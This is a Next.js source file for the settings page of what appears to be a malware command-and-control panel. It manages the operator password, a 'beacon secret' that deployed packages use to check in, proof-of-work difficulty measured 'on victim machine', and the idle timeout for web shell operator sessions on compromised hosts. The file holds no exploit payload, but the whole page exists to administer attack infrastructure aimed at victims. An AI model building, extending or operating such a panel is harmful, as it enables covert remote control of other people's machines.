import db from '@/lib/db';
import { changePasswordAction, regenSecretAction, savePoWAction, saveShellIdleTimeoutAction } from './actions';

export const dynamic = 'force-dynamic';

export default async function SettingsPage({
  searchParams,
}: {
  searchParams: Promise<{ error?: string; success?: string; show_secret?: string }>;
}) {
  const { error, success, show_secret } = await searchParams;

  const getSetting = (key: string) =>
    (db.prepare('SELECT value FROM settings WHERE key = ?').get(key) as { value: string } | undefined)?.value ?? '';

  const beaconSecret = getSetting('beacon_secret');
  const powEnabled = getSetting('pow_enabled') === '1';
  const powDifficulty = getSetting('pow_difficulty') || '5';
  const shellIdleTimeout = getSetting('shell_idle_timeout') || '180';

  const errorMsg: Record<string, string> = {
    'wrong-password': 'current password is incorrect',
    'missing-password': 'new password cannot be empty',
  };
  const successMsg: Record<string, string> = {
    'password': 'password updated',
    'secret': 'beacon secret regenerated — republish packages to apply',
    'pow': 'proof of work settings saved',
    'shell_idle_timeout': 'shell idle timeout saved',
  };

  return (
    <div className="max-w-lg space-y-8">
      <h1 className="text-lg font-bold">settings</h1>

      {error && <div className="text-red-400 text-sm border border-red-900 px-3 py-2">{errorMsg[error] ?? error}</div>}
      {success && <div className="text-green-400 text-sm border border-green-900 px-3 py-2">{successMsg[success] ?? success}</div>}

      {/* Auth */}
      <div className="border border-gray-800 p-4 space-y-3">
        <div className="text-xs text-gray-400">AUTH</div>
        <form action={changePasswordAction} className="space-y-3">
          <div className="space-y-1">
            <label className="text-xs text-gray-400">CURRENT PASSWORD</label>
            <input
              name="current_password"
              type="password"
              required
              className="w-full bg-black border border-gray-700 text-white text-sm p-2 focus:outline-none focus:border-white"
            />
          </div>
          <div className="space-y-1">
            <label className="text-xs text-gray-400">NEW PASSWORD</label>
            <input
              name="new_password"
              type="password"
              required
              className="w-full bg-black border border-gray-700 text-white text-sm p-2 focus:outline-none focus:border-white"
            />
          </div>
          <button type="submit" className="border border-white px-4 py-1 text-sm hover:bg-white hover:text-black transition-colors">
            change password
          </button>
        </form>
      </div>

      {/* Beacon secret */}
      <div className="border border-gray-800 p-4 space-y-3">
        <div className="text-xs text-gray-400">BEACON SECRET</div>
        <div className="text-sm font-mono text-gray-300">
          {show_secret === '1'
            ? beaconSecret
            : `${beaconSecret.slice(0, 8)}${'•'.repeat(28)}`}
        </div>
        <div className="flex gap-3">
          {show_secret !== '1' && (
            <a href="?show_secret=1" className="text-xs text-gray-400 hover:text-white border border-gray-700 px-3 py-1">
              show
            </a>
          )}
          <form action={regenSecretAction}>
            <button type="submit" className="text-xs border border-yellow-900 text-yellow-600 hover:bg-yellow-900 hover:text-yellow-200 px-3 py-1 transition-colors">
              regenerate
            </button>
          </form>
        </div>
        <p className="text-xs text-gray-600">regenerating invalidates all deployed packages — republish them to restore beacon check-in</p>
      </div>

      {/* Proof of Work */}
      <div className="border border-gray-800 p-4 space-y-3">
        <div className="text-xs text-gray-400">PROOF OF WORK</div>
        <form action={savePoWAction} className="space-y-3">
          <div className="flex items-center gap-4 text-sm">
            <label className="flex items-center gap-2 cursor-pointer">
              <input type="radio" name="pow_enabled" value="1" defaultChecked={powEnabled} className="accent-white" />
              enabled
            </label>
            <label className="flex items-center gap-2 cursor-pointer">
              <input type="radio" name="pow_enabled" value="0" defaultChecked={!powEnabled} className="accent-white" />
              disabled
            </label>
          </div>
          <div className="space-y-1">
            <label className="text-xs text-gray-400">DIFFICULTY (leading zero hex chars, 1–12)</label>
            <input
              name="pow_difficulty"
              type="number"
              min="1"
              max="12"
              defaultValue={powDifficulty}
              className="w-32 bg-black border border-gray-700 text-white text-sm p-2 focus:outline-none focus:border-white"
            />
            <p className="text-xs text-gray-600">
              difficulty 5 → avg ~3.5s on victim machine (2^20 hashes)
            </p>
          </div>
          <button type="submit" className="border border-white px-4 py-1 text-sm hover:bg-white hover:text-black transition-colors">
            save
          </button>
        </form>
      </div>
      {/* Shell idle timeout */}
      <div className="border border-gray-800 p-4 space-y-3">
        <div className="text-xs text-gray-400">SHELL IDLE TIMEOUT</div>
        <form action={saveShellIdleTimeoutAction} className="space-y-3">
          <div className="space-y-1">
            <label className="text-xs text-gray-400">TIMEOUT (seconds, 30–3600)</label>
            <input
              name="shell_idle_timeout"
              type="number"
              min="30"
              max="3600"
              defaultValue={shellIdleTimeout}
              className="w-32 bg-black border border-gray-700 text-white text-sm p-2 focus:outline-none focus:border-white"
            />
            <p className="text-xs text-gray-600">
              web shell operator connections auto-close after this many idle seconds (default 180)
            </p>
          </div>
          <button type="submit" className="border border-white px-4 py-1 text-sm hover:bg-white hover:text-black transition-colors">
            save
          </button>
        </form>
      </div>
    </div>
  );
}
